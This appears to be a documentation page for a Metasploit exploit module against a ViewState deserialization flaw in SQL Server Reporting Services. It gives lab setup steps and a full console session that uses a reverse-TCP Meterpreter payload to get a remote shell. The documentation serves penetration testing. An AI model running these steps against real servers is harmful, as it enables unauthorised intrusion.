{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/http/ssrs_navcorrector_viewstate","result":{"data":{"moduleMetadataJson":{"id":"395cdfa8-0fa3-5cb3-a7de-dc424ff5a899","name":"SQL Server Reporting Services (SSRS) ViewState Deserialization","fullname":"exploit/windows/http/ssrs_navcorrector_viewstate","description":"A vulnerability exists within Microsoft's SQL Server Reporting Services\n        which can allow an attacker to craft an HTTP POST request with a\n        serialized object to achieve remote code execution. The vulnerability is\n        due to the fact that the serialized blob is not signed by the server.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/http/ssrs_navcorrector_viewstate","documentationSlug":"/modules/documentation/exploit/windows/http/ssrs_navcorrector_viewstate"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits a .NET serialization vulnerability in the SQL Server\nReporting Services web application. The vulnerability exists within the a class\nthat will load serialized data submitted in a POST request. When processed this\ndata can lead to code execution within the context of the application which by\ndefault is a service account.</p>\n<p>An account is necessary in order to leverage this vulnerability. The request is\nsubmitted using NTLM basic authentication. This account must be assigned at\nleast the \"Browser\" role on the site. This is the lowest privilege available and\nsimply allows the user to view folders, reports and subscribe to reports. To\nauthenticate as a domain user, set the <code class=\"language-text\">DOMAIN</code> option.</p>\n<h3 id=\"service-installation-and-setup\" style=\"position:relative;\"><a href=\"#service-installation-and-setup\" aria-label=\"service installation and setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Service Installation And Setup</h3>\n<p>Setting up a vulnerable environment for testing is best done by using a SQL\nServer 2016 installation ISO which includes an offline installer for SSRS. Later\nversions of SQL Server installation ISOs link to an online installer which will\ninstall the patched version automatically.</p>\n<p>When installing SQL Server 2016:</p>\n<ol>\n<li>Select \"New SQL Server stand-alone installation or add features to an\nexisting installation\"</li>\n<li>Later in the \"Feature Selection\" section, select \"Reporting Services -\nNative\" under the \"Instance Features\" group</li>\n<li>Proceed with the remainder of the installation per usual</li>\n</ol>\n<p>After the server has been installed, it must be configured using the \"Reporting\nServices Configuration Manager\" application. Ensure a database is selected and\ncreated, that both the Web Services URL and Web Portal URLs are activated.\nFinally, from the web interface, add accounts and privileges as desired.\nIndividual accounts can have privileges added by selecting \"Manage Folder\" and\nadding them from this dashboard. <strong>Do not use privileges dashboard available\nfrom \"Site Settings\" to add the necessary privileges.</strong></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/http/ssrs_navcorrector_viewstate</code></li>\n<li>Set the <code class=\"language-text\">RHOSTS</code>, <code class=\"language-text\">USERNAME</code> and <code class=\"language-text\">PASSWORD</code> options</li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ssrs-2016-on-server-2012-x64\" style=\"position:relative;\"><a href=\"#ssrs-2016-on-server-2012-x64\" aria-label=\"ssrs 2016 on server 2012 x64 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSRS 2016 on Server 2012 x64</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/windows/http/ssrs_navcorrector_viewstate \nmsf5 exploit(windows/http/ssrs_navcorrector_viewstate) &gt; set RHOSTS 192.168.159.141\nRHOSTS =&gt; 192.168.159.141\nmsf5 exploit(windows/http/ssrs_navcorrector_viewstate) &gt; set USERNAME jdoe\nUSERNAME =&gt; jdoe\nmsf5 exploit(windows/http/ssrs_navcorrector_viewstate) &gt; set DOMAIN msflab.local\nDOMAIN =&gt; msflab.local\nmsf5 exploit(windows/http/ssrs_navcorrector_viewstate) &gt; set PASSWORD Password1\nPASSWORD =&gt; Password1\nmsf5 exploit(windows/http/ssrs_navcorrector_viewstate) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp\nPAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp\nmsf5 exploit(windows/http/ssrs_navcorrector_viewstate) &gt; set LHOST 192.168.159.128 \nLHOST =&gt; 192.168.159.128\nmsf5 exploit(windows/http/ssrs_navcorrector_viewstate) &gt; check\n[*] 192.168.159.141:80 - The service is running, but could not be validated.\nmsf5 exploit(windows/http/ssrs_navcorrector_viewstate) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.159.128:4444 \n[*] Command Stager progress -  24.99% done (2999/12002 bytes)\n[*] Command Stager progress -  49.98% done (5998/12002 bytes)\n[*] Command Stager progress -  74.96% done (8997/12002 bytes)\n[*] Sending stage (206403 bytes) to 192.168.159.141\n[*] Meterpreter session 3 opened (192.168.159.128:4444 -&gt; 192.168.159.141:50376) at 2020-03-06 16:19:24 -0500\n[*] Command Stager progress -  99.83% done (11982/12002 bytes)\n[*] Command Stager progress - 100.00% done (12002/12002 bytes)\n\nmeterpreter &gt; getuid\nServer username: NT Service\\ReportServer\nmeterpreter &gt; sysinfo\nComputer        : SERVER2012\nOS              : Windows 2012 R2 (6.3 Build 9600).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : MSFLAB\nLogged On Users : 10\nMeterpreter     : x64/windows\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"395cdfa8-0fa3-5cb3-a7de-dc424ff5a899"}}}